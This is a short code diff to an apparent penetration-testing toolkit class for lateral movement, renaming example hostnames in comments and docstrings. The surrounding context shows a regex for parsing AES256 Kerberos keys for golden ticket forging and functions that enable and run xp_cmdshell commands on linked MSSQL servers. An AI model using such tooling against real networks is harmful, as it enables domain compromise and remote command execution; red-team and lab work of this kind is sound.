@@ -748,7 +748,7 @@ class LateralMovementTools(Toolset):
         # AES keys are required for golden ticket generation on Windows 2016+
         # which rejects RC4/NTLM-based tickets with KDC_ERR_TGT_REVOKED
         # Pattern matches: [DOMAIN\]username:aes256-cts-hmac-sha1-96:hexkey
-        # \w+\$? allows trust accounts like ESSOS$ and machine accounts
+        # \w+\$? allows trust accounts like FABRIKAM$ and machine accounts
         aes_pattern = re.compile(
             r"^(?:([^\\:\s]+)\\)?(\w+\$?):aes256-cts-hmac-sha1-96:([a-fA-F0-9]{64})$"
         )
@@ -1628,7 +1628,7 @@ EXEC sp_linkedservers;
             xp_cmdshell enablement result on the linked server
 
         Example:
-            >>> mssql_linked_enable_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "contoso.local")
+            >>> mssql_linked_enable_xpcmdshell("192.168.58.22", "user", "pass", "SQL01", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1703,8 +1703,8 @@ EXEC sp_linkedservers;
             Command output from the linked server
 
         Example:
-            >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "whoami", "contoso.local")
-            >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "hostname && ipconfig", "contoso.local")
+            >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "SQL01", "whoami", "contoso.local")
+            >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "SQL01", "hostname && ipconfig", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
